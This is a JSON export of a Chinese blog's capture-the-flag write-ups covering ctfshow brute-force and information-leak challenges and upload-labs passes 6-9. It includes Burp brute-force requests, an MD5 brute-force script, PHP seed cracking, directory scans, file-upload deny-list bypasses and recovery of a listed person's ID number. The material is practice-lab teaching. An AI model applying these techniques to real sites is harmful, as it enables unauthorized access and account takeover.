{"meta":{"title":"REZEのblog","subtitle":"我喜欢你","description":"welcome!","author":"REZE","url":"http://example.com","root":"/"},"pages":[{"title":"标签页","date":"2018-01-04T16:00:00.000Z","updated":"2025-04-05T05:25:40.287Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-01-04T16:00:00.000Z","updated":"2025-04-05T05:28:08.940Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"ctfshow 爆破(web21-28)","slug":"CTFwp/ctfshow爆破(web21-28)","date":"2025-07-01T16:00:00.000Z","updated":"2025-07-02T13:41:04.709Z","comments":true,"path":"2025/07/02/CTFwp/ctfshow爆破(web21-28)/","permalink":"http://example.com/2025/07/02/CTFwp/ctfshow%E7%88%86%E7%A0%B4(web21-28)/","excerpt":"","text":"web21需要用户名和密码才能继续访问 用户名猜一下admin 传到bp里爆破 GET / HTTP/1.1Host: bb20197e-b7cb-42b4-a3ca-0d5a06291357.challenge.ctf.showCache-Control: max-age=0Authorization: Basic MTExMTExMTExOjExMTExMTExMTExMTE=Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;133&quot;, &quot;Not(A:Brand&quot;;v=&quot;99&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-alive 我们注意到， MTExMTExMTExOjExMTExMTExMTExMTE= 是我们刚刚随便输入的密码，中间被:分隔，再被base64编码了一次，传输到intruder里 标为payload处，设置条件 1.前缀admin: 2.base64编码 记得取消url编码 开始爆破 HTTP/1.1 200 OKServer: nginx/1.20.1Date: Wed, 02 Jul 2025 12:27:20 GMTContent-Type: text/html; charset=utf-8Connection: keep-aliveX-Powered-By: PHP/7.3.11Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONSAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Max-Age: 1728000Content-Length: 45ctfshow&#123;13e7a194-6d9a-4ed5-ae80-c51da9f628d8&#125; 得到flag ctfshow&#123;13e7a194-6d9a-4ed5-ae80-c51da9f628d8&#125; web22官方域名失效 web23&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-03 11:43:51# @Last Modified by: h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 拿到题目，先对题目进行分析 传入token if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; 要求token的MD5 的第 2 位、第 15 位、第 18 位字符必须相同 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; 把第 2、第 15、第 18 位字符转为数字（intval()），求和后除以其中一个（第 2 位），要求等于第 32 位字符的数值。 使用python脚本爆破得到符合题意的token import hashlibdef check(md5_str): c1 = md5_str[1] c2 = md5_str[14] c3 = md5_str[17] c4 = md5_str[31] # 条件1: 三位相等 if c1 != c2 or c2 != c3: return False # 条件2: (int(c1)+int(c2)+int(c3)) / int(c1) == int(c4) try: n1 = int(c1) n2 = int(c2) n3 = int(c3) n4 = int(c4) except: return False if n1 == 0: return False result = (n1 + n2 + n3) / n1 return result == n4# 枚举输入for i in range(0, 1000000): s = str(i) md5_val = hashlib.md5(s.encode()).hexdigest() if check(md5_val): print(f&quot;[+] Found! Input: &#123;s&#125;&quot;) print(f&quot;MD5: &#123;md5_val&#125;&quot;) break 最终得到token的值为422 提交得到flag ctfshow&#123;fd42cfa8-7422-4cba-b7c0-d5b628b0c492&#125; web24mt_sand（）伪随机数 mt_rand() 是 PHP 中的一个函数，用于生成 伪随机整数，它的全称是 Mersenne Twister random。它比早期的 rand() 函数速度更快、随机性更好，因此通常建议使用 mt_rand() 替代 rand()。 这里给定了随机数种子372619038 若传递的r的值与随机出的一个值相同，就能得到flag 但mt_seed给定了种子，得到的随机数每一次都是相同的，我们可以提前运行一次mt_rand(372619038),把得到的值传递给r，就能得到flag &lt;?phpmt_srand(372619038);echo mt_rand().&#x27;&lt;br&gt;&#x27;;?&gt; 得到运行结果1155388967，将其传给r，得到flag 1155388967 web25&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-03 13:56:57# @Last Modified by: h1xa# @Last Modified time: 2020-09-03 15:47:33# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 我的理解: 首先需要了解的几个值 1.种子:这里被设定为flag的md5值中截取8位数，作为种子数 确定了种子后，mt_rand()的每一次值都是确定的 2.r，r是我们传递的数，对破解种子和后面if(!$rand)起作用 3.rand,rand是 r与第一次mt_rand之差 接下来我们确定做题步骤 1.得到第一次mt_rand 我们可以通过设置r&#x3D;0，得到-mt_rand 2.反向破解mt_rand，得到种子，有了种子，我们就能得到每一次mt_rand的值，最后得到flag 这里需要借助到反向破解mt_rand的工具：php_mt_seed 我们将mt_sand的值传入后，得到了很多值，这些种子运算一次得到的都是同一个值， 我们通过php的版本，得到可能是我们的种子，不多，多试几次就出来了 ，有了种子，事情就好解决了 3.if(!$rand)，rand的值必须为0，这样!0才会为真，让r&#x3D;第一次mt_rand(),这样rand为0，进入下一步 4.传入token，用burpsuite也行，hackbar也行，传入token，得到flag ctfshow&#123;069a6013-d7e1-42a7-a6e5-0ca9e710f2fa&#125; web26就是爆破一个密码值，爆出来就有flag了 ctfshow&#123;68667d15-bbbf-43e2-9184-b74dbfbfb408&#125; web27在录取名单中，我们能看到一些学生的姓名和部分身份证号， 我们选择迫害郎康焕同学（） 郎康焕522601********8092 很巧，522601********8092米被码住的地方是生日，我们选择使用bp，在查询系统中用日期爆破 最终得到身份证号：522601199210248092 接下来就用它拿到学号 恭喜您，您已被我校录取，你的学号为10248092 初始密码为身份证号码 至此 郎康焕52260119921024809210248092 登录后得到flag 恭喜您，登陆成功!ctfshow&#123;f706753e-aa01-4cd7-8af8-7f1825c4f70b&#125; web28拿到题目，看到url中有0&#x2F;1&#x2F;2.txt 在0和1两处添加payload位置，爆破后在72&#x2F;20&#x2F;处找到flag ctfshow&#123;205b50db-6eb2-4035-933c-3f3d1f3cb2e1&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow wp——信息搜集(web01-web20)","slug":"CTFwp/ctfshow信息泄露（web1-20）","date":"2025-06-27T16:00:00.000Z","updated":"2025-06-30T14:51:41.139Z","comments":true,"path":"2025/06/28/CTFwp/ctfshow信息泄露（web1-20）/","permalink":"http://example.com/2025/06/28/CTFwp/ctfshow%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88web1-20%EF%BC%89/","excerpt":"","text":"ctfshow wp——信息搜集(web01-web20) web1web1:where is flag?开发注释未及时删除 F12查看源代码 &lt;!--# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 13:45:32# @Last Modified by: h1xa# @Last Modified time: 2020-09-02 03:12:48# @email: h1xa@ctfer.com# @link: https://ctfer.com--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;web1:where is flag?&lt;/h3&gt; &lt;!-- ctfshow&#123;9f6f5c41-03aa-4042-9104-41213bc6e21f&#125; --&gt;&lt;/body&gt;&lt;/html&gt; 得到flag: ctfshow&#123;9f6f5c41-03aa-4042-9104-41213bc6e21f&#125; web2js前台拦截 === 无效操作 无法查看源代码 ctrl+u查看网页源代码 &lt;!--# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 13:45:32# @Last Modified by: h1xa# @Last Modified time: 2020-09-02 03:20:04# @email: h1xa@ctfer.com# @link: https://ctfer.com--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.oncontextmenu = function()&#123;return false&#125;; window.onselectstart = function()&#123;return false&#125;; window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;无法查看源代码&lt;/h3&gt; &lt;!-- ctfshow&#123;1479640a-73e2-41c6-b759-bd17cb1daa38&#125; --&gt;&lt;/body&gt;&lt;/html&gt; 得到flag ctfshow&#123;1479640a-73e2-41c6-b759-bd17cb1daa38&#125; web3没思路的时候抓个包看看，可能会有意外收获 web3:where is flag? F12,查看网络项 access-control-allow-credentialstrueaccess-control-allow-headersDNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connectionaccess-control-allow-methodsGET,POST,PUT,DELETE,OPTIONSaccess-control-expose-headersContent-Type,Cookies,Aaa,Date,Server,Content-Length,Connectionaccess-control-max-age1728000connectionkeep-alivecontent-encodinggzipcontent-typetext/html; charset=UTF-8dateMon, 30 Jun 2025 13:31:48 GMTflagctfshow&#123;91bf4b26-5e76-43b7-a694-9970908eae96&#125;servernginx/1.20.1transfer-encodingchunkedx-powered-byPHP/7.3.11 得到flag ctfshow&#123;91bf4b26-5e76-43b7-a694-9970908eae96&#125; web4总有人把后台地址写入robots，帮黑阔大佬们引路。 web4:where is flag? 根据题目提示，查看robots.txt User-agent: *Disallow: /flagishere.txt 查看url&#x2F;&#x2F;flagishere.txt 得到flag ctfshow&#123;78888822-0dce-47fc-b6c2-1f7b69302800&#125; web5phps源码泄露有时候能帮上忙 查看url&#x2F;index.phps &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 14:14:17# @Last Modified by: h1xa# @Last Modified time: 2020-09-01 14:34:53# @email: h1xa@ctfer.com# @link: https://ctfer.com*///ctfshow&#123;1b4b42ee-d038-433d-8639-1a24fbb4a22b&#125;echo &quot;web5:where is flag ?&quot; 得到flag ctfshow&#123;1b4b42ee-d038-433d-8639-1a24fbb4a22b&#125; web6解压源码到当前目录，测试正常，收工 使用dirsearch工具扫描 C:\\Users\\reze&gt;cd dirsearchC:\\Users\\reze\\dirsearch&gt;python dirsearch.py -u https://f360c7dc-a7bb-45bd-b817-976fafd54ca1.challenge.ctf.show/ _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://f360c7dc-a7bb-45bd-b817-976fafd54ca1.challenge.ctf.show/[21:39:29] Scanning:[21:40:11] 200 - 486B - /www.zipTask Completed 查看url&#x2F;&#x2F;www.zip 压缩包内有两项，提示我flag在fl000g.txt 查看url&#x2F;fl000g.txt 得到flag ctfshow&#123;2a987e6b-6f7b-4c8a-9ee3-5709f9579f00&#125; web7版本控制很重要，但不要部署到生产环境更重要。 web7:where is flag? _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://c1117d39-2102-4589-bb57-a93d1868f6af.challenge.ctf.show/[21:45:28] Scanning:[21:45:32] 301 - 169B - /.git -&gt; http://c1117d39-2102-4589-bb57-a93d1868f6af.challenge.ctf.show/.git/[21:45:32] 200 - 46B - /.git/ 查看url&#x2F;.git 得到flag ctfshow&#123;147711f6-e831-4c04-bdfc-67a3f3d079fc&#125; web8版本控制很重要，但不要部署到生产环境更重要。 web8:where is flag? 扫描url _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://ea06a964-c13c-46f6-8f34-692761ba5ff1.challenge.ctf.show/[21:47:32] Scanning:[21:47:38] 301 - 169B - /.svn -&gt; http://ea06a964-c13c-46f6-8f34-692761ba5ff1.challenge.ctf.show/.svn/[21:47:38] 200 - 46B - /.svn/ 查看url&#x2F;.svn 得到flag ctfshow&#123;970a109e-cace-4ac4-bbf5-a3fad8a2694c&#125; web9发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 web9:where is flag? 查看url&#x2F;index.php.swp 得到flag ctfshow&#123;8d17cc96-d8c3-4907-bb90-e7a3d87384f0&#125; web10cookie 只是一块饼干，不能存放任何隐私数据 F12查看网络选项，找到cookie cookieflag=ctfshow%7B6d5fcbf9-ade6-4f26-bece-63809cfccca3%7D 得到flag ctfshow&#123;6d5fcbf9-ade6-4f26-bece-63809cfccca3&#125; web11域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息 使用指令扫描 nslookup -q=txt flag.ctfshow.com 得到flag flag&#123;just_seesee&#125; web12有时候网站上的公开信息，就是管理员常用密码 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://e8f7fb3f-cc4e-4b23-9cf1-05e5f553b39d.challenge.ctf.show/[21:59:26] Scanning:[22:00:18] 301 - 169B - /admin -&gt; http://e8f7fb3f-cc4e-4b23-9cf1-05e5f553b39d.challenge.ctf.show/admin/[22:00:21] 401 - 42B - /admin/[22:00:23] 401 - 42B - /admin/index.php 查看url&#x2F;admin，显示需要用户名和密码，用户名尝试admin，嗯句题目提示，在最底部看到了一串数字:372619038，作为密码尝试，得到flag ctfshow&#123;bf0af490-344e-4dec-af4d-523d29132b41&#125; web13技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码 在网页的底部，看到了documents一项，点击去后发现 ⚫ 登陆默认后台地址：http://your-domain/system1103/login.php默认用户名：admin默认密码：admin110 登录后得到flag ctfshow&#123;935e116b-f16f-4541-a30a-805c4c67b287&#125; web14有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人 根据题目提示，查看url&#x2F;eidtor 在提交文件中，可查看服务器文件，找到flag ctfshow&#123;0c6d851d-36df-4203-a237-7f8aa1419c8c&#125; web15公开的信息比如邮箱，可能造成信息泄露，产生严重后果 用dirsearch扫描url _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://fd633af2-e216-4deb-9707-ef6482a1063a.challenge.ctf.show/[22:21:05] Scanning:[22:21:25] 200 - 8KB - /about.html[22:21:28] 301 - 169B - /admin -&gt; http://fd633af2-e216-4deb-9707-ef6482a1063a.challenge.ctf.show/admin/[22:21:29] 200 - 1KB - /admin/[22:21:30] 200 - 1KB - /admin/index.php 进入url&#x2F;admin 后台登录选项，点击忘记密码 我的所在地是哪个城市？ 在原页面中，透露了qq邮箱 用qq找到了本人，显示是西安人，输入西安后密码被重置为admin7789 用其登录后拿到flag ctfshow&#123;6a8cea05-5a2d-43f8-bde0-c8f3bdc8be5e&#125; web16对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 查看探针url&#x2F;tz.php 点进后查看phpinfo 找到flag FLAG ctfshow&#123;35c5c564-a0b8-445e-b928-311cedd8863c&#125; web17备份的sql文件会泄露敏感信息 用dirsearch扫描 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://e15c4b4f-7842-4f09-a974-5262d44209fa.challenge.ctf.show/[22:30:15] Scanning:[22:30:30] 200 - 934B - /backup.sql[22:30:37] 301 - 185B - /images -&gt; http://e15c4b4f-7842-4f09-a974-5262d44209fa.challenge.ctf.show/images/[22:30:37] 403 - 571B - /images/ 查看url&#x2F;backup.sql 得到flag ctfshow&#123;b6dab5f3-a3b3-457e-a558-3512f442a316&#125; web18不要着急，休息，休息一会儿，玩101分给你flag F12查看源代码，得到了 if(score&gt;100)&#123;var result=window.confirm(&quot;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b&quot;);&#125; 解码后发现是 16进制转字符: 你赢了，去幺幺零点皮爱吃皮看看 查看url&#x2F;110.php，得到flag ctfshow&#123;e5fa4ecb-d807-4f12-ba14-727328dbe3fa&#125; web19密钥什么的，就不要放在前端了 F12查看源代码，发现 &lt;/script&gt; &lt;!-- error_reporting(0); $flag=&quot;fakeflag&quot; $u = $_POST[&#x27;username&#x27;]; $p = $_POST[&#x27;pazzword&#x27;]; if(isset($u) &amp;&amp; isset($p))&#123; if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123; echo $flag; &#125;&#125; --&gt; 使用burpsuit抓包 POST / HTTP/1.1Host: 44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.showUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 88Origin: https://44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.showReferer: https://44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.show/Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Priority: u=0, iTe: trailersConnection: keep-aliveusername=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04 得到flag ctfshow&#123;38547630-0ea1-4d66-9923-44b98a926d0b&#125; web20mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 扫描发现url&#x2F;db&#x2F;db.mdb 下载后查看，找到flag flag&#123;ctfshow_old_database&#125; 至此，完结","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"uploads-lab6-10","slug":"CTFwp/uploads-labs6-10","date":"2025-05-23T16:00:00.000Z","updated":"2025-05-24T13:05:40.053Z","comments":true,"path":"2025/05/24/CTFwp/uploads-labs6-10/","permalink":"http://example.com/2025/05/24/CTFwp/uploads-labs6-10/","excerpt":"","text":"uploads-lab6-10 pass6： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源代码，发现并没有删除大写小，我们先上传php文件，再在bp中修改后缀大小写，上传成功 pass-7: $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源码，我们发现并没有删除空格，我们先上传php文件，在后缀后加上几个空格即可 上传成功 pass8： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看文件，我们发现并没有删去后缀中的”.”，我们先上传php文件 再在后缀中加上一个”.” 上传成功 pass9: $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = 